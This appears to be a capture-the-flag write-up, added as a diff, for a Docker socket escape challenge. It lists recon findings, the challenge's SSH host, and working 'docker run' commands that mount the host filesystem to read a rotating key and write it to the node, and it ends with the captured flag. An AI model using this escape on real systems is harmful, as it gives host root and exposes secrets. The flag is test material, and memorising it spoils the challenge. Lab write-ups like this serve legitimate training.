@@ -1,0 +1,35 @@
+goal: Docker-sock-escape — /var/run/docker.sock is mounted into the container.
+Use it to read the node's /opt/node/rotation.key and write its value to
+/opt/node/.proof on the actual node (not just inside our own container), then
+run `verify`.
+
+recon:
+- SSH login (docker-sock-escape@204.168.229.209:2223) again drops into a
+  BusyBox ash shell as root inside a container. `docker` CLI is present.
+- `ls -la /var/run/docker.sock` -> srw-rw---- root:999 — owned by root, so
+  our root shell can talk to it regardless of group membership.
+- `docker images` showed a prebuilt local image `phantom/workspace:1.0`.
+  `docker info` showed default runtime is plain `runc` (not sysbox), so
+  containers spawned via this socket are NOT sandboxed the way the SSH
+  container itself might be.
+- `docker ps -a` showed our own SSH session is itself a container named
+  "foothold" (confirmed via `docker inspect foothold`: HostConfig.Binds =
+  ["/var/run/docker.sock:/var/run/docker.sock"], Runtime: runc, PID/Path
+  "sleep infinity" as the container's main process, our shell is a `docker
+  exec` into it). So containers we launch via the socket are true siblings
+  on the real host, not nested another level down.
+- First attempt: `docker run --rm --privileged -v /:/host phantom/workspace:1.0
+  sh -c "cat /host/opt/node/rotation.key > /host/opt/node/.proof"` — read
+  succeeded but a later `verify` said "no proof on the node yet". Follow-up
+  recon (separate `docker run` a bit later) showed the rotation.key VALUE HAD
+  CHANGED between runs — it's a live-rotating secret. The earlier write was
+  stale by the time `verify` ran (several recon commands/output had elapsed
+  in between).
+
+exploit/steps (do this as the LAST thing before `verify`, no extra commands
+in between so the value can't rotate out from under you):
+  docker run --rm -v /opt/node:/node phantom/workspace:1.0 \
+    sh -c "cat /node/rotation.key > /node/.proof"
+  verify
+
+flag: bl_728a86e187f2e71e0aa2a7c332f92aa7
